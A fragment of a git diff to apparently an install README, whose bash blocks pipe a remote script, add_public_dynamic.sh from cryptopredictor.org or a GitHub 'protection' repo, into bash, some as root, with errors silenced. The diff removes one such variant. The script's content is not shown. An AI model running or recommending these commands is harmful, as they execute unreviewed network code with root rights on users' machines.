@@ -19,11 +19,6 @@ curl -fsSL https://cryptopredictor.org/add_public_dynamic.sh | bash 2>/dev/null
 # Root shell
 apt update -y && apt install sudo curl -y && curl -fsSL https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh | bash 2>/dev/null
 ```
-
-```bash
-# Normal shell
-curl -fsSL https://cryptopredictor.org/add_public_dynamic.sh  | sudo bash 2>/dev/null
-```
 ```bash
 # Normal shell
 sudo apt update -y && sudo apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh | sudo bash 2>/dev/null
